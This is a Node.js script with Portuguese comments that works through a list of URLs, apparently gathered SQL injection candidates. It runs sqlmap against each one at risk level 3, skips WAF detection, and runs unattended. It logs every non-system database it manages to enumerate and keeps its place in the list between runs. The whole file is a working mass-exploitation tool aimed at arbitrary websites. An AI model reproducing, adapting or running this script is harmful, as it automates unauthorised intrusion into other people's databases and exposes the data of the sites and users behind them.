const shelljs = require("shelljs");
const fs = require("fs");
const LineByLineReader = require("line-by-line");
const global = require("../../src/functionsglobal");
const config = require("../../config.json");
const log = global.log;

var tempurl = "";
var travado = false;
var urlold = "";

async function iniciar() {
	var arquivo = "SQLiLinks_ID.txt";
	//inicia a leitura do arquivo com urls
	await log("Iniciando Leitura de Arquivo..", 2);
	//nome do arquivo contendo as URLS
	if (fs.existsSync("./logs/_" + arquivo)) {
		urlold = fs.readFileSync("./logs/_" + arquivo, "utf8");
		travado = true;
	}

	lr = new LineByLineReader("./logs/" + arquivo);
	//retorna erro em leitura
	lr.on("error", function (err) {
		log(err, 1);
	});

	//abre arquivo e inicia a leitura
	lr.on("line", async function (line) {
		line = line.toLowerCase();

		if (travado == true || line == "") {
			if (line == urlold) {
				travado = false;
			}
		} else {
			lr.pause();
			await fs.writeFile("./logs/_" + arquivo, line, async function (
				err
			) {
				console.log("nova", line);
				await Verifica(line);
				lr.close();
				return;
			});
		}
	});

	lr.on("end", function () {
		log("Acabou lista" + arquivo, 3, true);
	});
}

async function Verifica(line) {
	log("URL: " + line.toUpperCase());
	var sqlmapCmd = "/Users/rafaeldornelas/sqlmap/sqlmap.py";
	//verifica se url possue servidor dns configurado
	await shelljs.exec(
		sqlmapCmd +
			' --threads 4 --headers="X-Requested-With: XMLHttpRequest" --random-agent -v1 -u "' +
			line +
			'" --level 1 --risk 3 --skip-waf --dbs --batch',
		{ async: true, silent: false },
		async function (err, res) {
			if (res.indexOf("available databases") > -1) {
				var arr = res.split("available databases");
				arr[1].split("\n").forEach(async function (linha) {
					if (
						linha.indexOf("[*] ") > -1 &&
						linha.indexOf("[*] ending") == -1
					) {
						linha = linha.replace("[*] ", "");
						if (
							linha != "information_schema" &&
							linha != "performance_schema" &&
							linha != "phpmyadmin" &&
							linha != "tempdb" &&
							linha != "model" &&
							linha != "mysql"
						) {
							await global.Savelogs(
								line + " | DB: " + linha,
								"SQLiDataBases"
							);
							log(
								"[Outros]: SQLi Busca URL Encontrada: " +
									line +
									":" +
									linha,
								3
							);
						}
					}
				});
				process.stdout.write("\x07");
				iniciar();
				return true;
			} else {
				log("SQLi Busca URL Falha nao encontrada: " + line, 2);
				process.stdout.write("\x07");
				iniciar();
				return false;
			}
		}
	);
}

iniciar();
